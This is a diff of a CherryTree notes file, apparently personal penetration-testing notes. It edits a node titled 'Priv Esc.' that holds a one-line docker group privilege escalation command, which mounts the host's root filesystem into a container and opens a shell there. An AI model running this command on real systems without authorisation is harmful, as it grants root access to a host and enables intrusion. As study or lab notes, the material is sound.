@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="11" master_id="0" name="Priv Esc." prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="112" is_bold="1" foreground="#1c71d8" ts_creation="1712711970" ts_lastsave="1712712777">
+  <node unique_id="11" master_id="0" name="Priv Esc." prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="112" is_bold="1" foreground="" ts_creation="1712711970" ts_lastsave="1712715471">
     <rich_text>
 docker group priv escalation docker run -v /:/mnt --rm -it alpine chroot /mnt sh </rich_text>
   </node>
